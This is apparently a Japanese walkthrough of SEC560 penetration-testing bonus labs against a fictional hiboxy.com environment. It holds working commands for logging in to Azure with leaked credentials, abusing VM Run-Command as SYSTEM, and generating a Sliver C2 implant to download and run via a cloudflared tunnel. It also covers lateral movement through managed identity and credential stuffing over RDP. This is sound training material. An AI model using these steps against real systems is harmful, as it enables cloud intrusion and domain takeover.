# Walkthrough

提供された資料に基づく、SEC560のボーナスラボ（追加演習）のウォークスルー（手順書）です。これらのラボは、本編で学んだ技術を応用し、クラウド環境（Azure）の悪用やLinux環境からの初期アクセスなど、より高度な攻撃シナリオを実践します。

---

### Bonus Lab: Cracking a NTLMv1 Handshake to an NT hash

**目的:** NTLMv1プロトコルとDES暗号の仕組みを理解し、キャプチャしたNTLMv1接続（ハンドシェイク）からNTハッシュをクラックする手法を学びます。 _(※詳細なコマンド手順は資料内で割愛されていますが、NTLMv1の脆弱性を利用してハッシュをダンプ・解読する概念を学習します)_

---

### Bonus Lab: Running Commands via Azure

**目的:** 漏洩した認証情報を用いてAzure CLI経由でログインし、Azure環境の構成ミスをスキャンした上で、ネットワークプロトコルに依存せずにAzureの管理機能（コントロールプレーン）を利用して仮想マシン（VM）上でコマンドをリモート実行します。

**ステップ 1: Azure CLIを用いたログイン**

- Linux VMから、取得済みの資格情報（例: `aparker@hiboxy.com` / `Oozle11`）を使用してAzureにログインします。
    
    ```
    az login -u aparker@hiboxy.com -p Oozle11
    ```
    

**ステップ 2: ScoutSuiteによる権限と構成のスキャン**

- ログインしたユーザーの権限で、`ScoutSuite`を実行し、Azureテナント（`hiboxy.com`）内のリソースや構成上の弱点をスキャンしてHTMLレポートを生成します。
    
    ```
    scout azure --user-account --report-dir /tmp/scoutsuite --tenant hiboxy.com --no-browser
    ```
    

**ステップ 3: アクセス可能な仮想マシンの特定とコマンド実行**

- `az vm list -o table` コマンドを実行し、環境内に存在する仮想マシン（`Win10-Desktop`群や`hiboxy-dc1`）を特定します。
- **Azure Run-Command** を悪用し、VMの内部に直接アクセスすることなく、管理エージェント経由でSYSTEM権限としてPowerShellスクリプトを実行させます。
    
    ```
    az vm run-command invoke --command-id RunPowerShellScript --name Win10-Desktop1 -g HIBOXY --script 'Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | ConvertTo-Json -Depth 64 -Compress; whoami'
    ```
    
- _結果として `nt authority\system` の権限で実行されていることや、Instance Metadata Service (IMDS) から情報を取得できることが確認できます_。

---

### Bonus Lab: Gaining Access and Moving Laterally

**目的:** ボーナスラボ「Running Commands via Azure」でのアクセスを起点に、Cloudflaredトンネルを用いてC2（Command & Control）インフラを構築し、内部デスクトップPCを侵害します。さらに、そのマシンのManaged Identity（管理ID）を悪用してドメインコントローラーへ横展開（ラテラルムーブメント）し、ドメイン支配を達成します。

**ステップ 1: C2インフラの準備とインプラントの生成**

- `cloudflared` を使用して、外部から安全に通信可能なHTTPトンネルを確立します。
- SliverなどのC2フレームワークで、Windows用のインプラント（ペイロード）を生成します。
    
    ```
    generate --os windows --skip-symbols -e --http <YOUR_CLOUDFLARED_URL>
    ```
    

**ステップ 2: 対象VMへの初期侵入**

- Azure CLIの `Run-Command` を再度利用し、対象のVM（例: `Win10-Desktop4`）にインプラントをダウンロードさせて、バックグラウンドプロセスとして実行（`Start-Process`）させます。
- これにより、クラウドインフラを介してネットワーク内部のWindows PCのSYSTEM権限シェル（C2セッション）を獲得します。

**ステップ 3: Managed Identityを利用したドメインコントローラーへの横展開**

- 侵害したVM上で、そのVMに付与された**システム割り当てマネージドID（SystemAssigned Identity）**を使用してAzureに再ログインします。
    
    ```
    execute -o -t 30 -- az.cmd login -i
    ```
    
- このIDの権限を利用して `az vm list` を実行し、新たにドメインコントローラー（`hiboxy-dc1`）を発見します。
- 初期侵入と全く同じ `Run-Command` の手法を用いて、`hiboxy-dc1` 上でインプラントを実行させ、Primary Domain ControllerのSYSTEM権限を奪取します（ドメイン支配の完了）。

---

### Bonus Lab: Credential Stuffing to a Breach From Linux

**目的:** Workbook 1で実施した攻撃を、Linux環境から実行する手順です。RDPサーバーに対するクレデンシャルスタッフィングと、ADExplorerを用いたActive Directoryデータの持ち出しを行います。

**ステップ 1: 漏洩認証情報の利用とRDP接続**

- `nmap` の `rdp-ntlm-info` スクリプトを使用して、ターゲットRDPサーバーのドメイン情報（`hiboxy.com`）を確認します。
- LinuxのRDPクライアントである `xfreerdp` を使用して、有効な認証情報でRDPサーバー（`10.130.10.23`）にログインします。この際、`/drive` オプションを使用してLinuxローカルのディレクトリ（`/home/sec560/labs`）をマウントします。
    
    ```
    xfreerdp /u:hiboxy\\<USER> /p:"<PASS>" /v:10.130.10.23 /drive:labs,/home/sec560/labs /cert-ignore
    ```
    

**ステップ 2: AD情報の抽出と解析**

- RDP接続したWindows上で `ADExplorer` を実行し、Active Directoryの情報をスナップショットとしてマウントしたLinux側のドライブに保存します。
- 保存したJSONファイルをLinux側で `jq` コマンドを用いて解析し、Kerberoast攻撃の対象となるアカウント（SPNが設定されたユーザー）などの詳細な情報を抽出します。